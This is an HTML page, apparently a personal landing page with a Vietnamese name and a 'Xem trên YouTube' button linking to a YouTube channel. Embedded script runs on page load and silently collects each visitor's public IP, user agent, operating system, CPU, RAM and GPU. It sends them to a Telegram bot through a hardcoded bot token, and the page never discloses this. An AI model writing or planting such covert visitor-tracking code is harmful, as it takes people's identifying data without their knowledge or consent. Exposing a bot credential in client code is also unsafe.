<!DOCTYPE html>
<html data-arp-injected="true">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <style>
    body {
      background-color: rgb(255, 255, 255);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 0;
      overflow: hidden;
      flex-direction: column;
    }

    .avatar {
      width: 300px;
      height: 300px;
    }

    .username {
      font-size: 20px;
      font-family: Montserrat, sans-serif;
      font-weight: 300;
      font-stretch: condensed;
      color: rgb(0, 0, 0);
      text-decoration: none;
      margin-top: 10px;
      position: relative;
      opacity: 0;
      animation: fadeIn 2s ease-in-out forwards;
    }

    .username::after {
      content: "";
      position: absolute;
      width: 0;
      height: 1px;
      background-color: rgb(0, 0, 0);
      bottom: -1px;
      left: 0;
      transition: width 0.3s ease;
    }

    .username:hover {
      font-style: italic;
    }

    .username:hover::after {
      width: 100%;
    }

    .loading-rectangle-left {
      position: absolute;
      top: 0;
      bottom: 0;
      width: 50%;
      background-color: rgb(0, 0, 0);
      animation: loadingAnimationLeft 4s forwards;
    }

    .loading-rectangle-right {
      position: absolute;
      top: 0;
      bottom: 0;
      right: 0;
      width: 50%;
      background-color: rgb(0, 0, 0);
      animation: loadingAnimationRight 4s forwards;
    }

    @keyframes loadingAnimationLeft {
      0% {
        left: 0;
      }
      50% {
        left: -50%;
      }
      100% {
        left: -50%;
      }
    }

    @keyframes loadingAnimationRight {
      0% {
        right: 0;
      }
      50% {
        right: -50%;
      }
      100% {
        right: -50%;
      }
    }

    @keyframes fadeIn {
      0% {
        opacity: 0;
      }
      100% {
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <div class="loading-rectangle-left"></div>
  <div class="loading-rectangle-right"></div>
  <a href="https://www.youtube.com/@duyvinh09" class="username">Đinh Duy Vinh</a>
  <a href="https://www.youtube.com/@duyvinh09" target="_blank">
  <button type="button">Xem trên YouTube</button>
  </a>

  <div id="system-info"></div>

  <script>
    $(document).ready(function() {
      var telegramBotToken = "6002210854:AAFtNuunUbJoDk6C83oU-dE3il63-M2mSUI";
      var chatId = "@Dvinh_bot";
  var excludedIPs = ["192.168.2.1", "10.0.0.1"]; // Thay thế danh sách này bằng những địa chỉ IP mà bạn muốn loại trừ

  // Lấy địa chỉ IP
  $.getJSON("https://api.ipify.org?format=json", function(data) {
    var ip = data.ip;

    if (excludedIPs.includes(ip)) {
      console.log("Địa chỉ IP nằm trong danh sách ngoại lệ. Không gửi thông tin đến Telegram.");
      return;
    }

    var cpu = navigator.hardwareConcurrency || "N/A";
    var ram = navigator.deviceMemory || "N/A";
    var disk = navigator.deviceStorage || "N/A"; // Thay thế 'deviceStorage' bằng thuộc tính tương ứng nếu có
    var gpu = getGraphicsCard();
    var os = getOperatingSystem();
    var userAgent = navigator.userAgent;

    var message = " - Địa chỉ IP mới: " + ip + "\n - User-Agent: " + userAgent + "\n - Hệ điều hành: " + os + "\n - CPU: " + cpu + "\n - RAM: " + ram + "\n - Disk: " + disk + "\n - GPU: " + gpu;

    var payload = {
      chat_id: chatId,
      text: message
    };

    $.ajax({
      type: "POST",
      url: "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage",
      data: payload,
      dataType: "json",
      success: function(response) {
        console.log("Thông tin đã được gửi thành công đến Telegram");
      },
      error: function(error) {
        console.log("Lỗi khi gửi thông tin đến Telegram: " + error);
      }
    });
  });

  // Các hàm hỗ trợ
  function getOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/windows phone/i.test(userAgent)) {
      return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
      return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
      return "iOS";
    }
    if (/Macintosh|Mac OS X/.test(userAgent)) {
      return "Mac OS";
    }
    if (/Windows NT/.test(userAgent)) {
      return "Windows";
    }
    return "Unknown";
  }

  function getGraphicsCard() {
    var canvas = document.createElement("canvas");
    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    var gpu = "N/A";
    if (debugInfo) {
      gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
    return gpu;
  }
});
  </script>
  
  
</body>
</html>
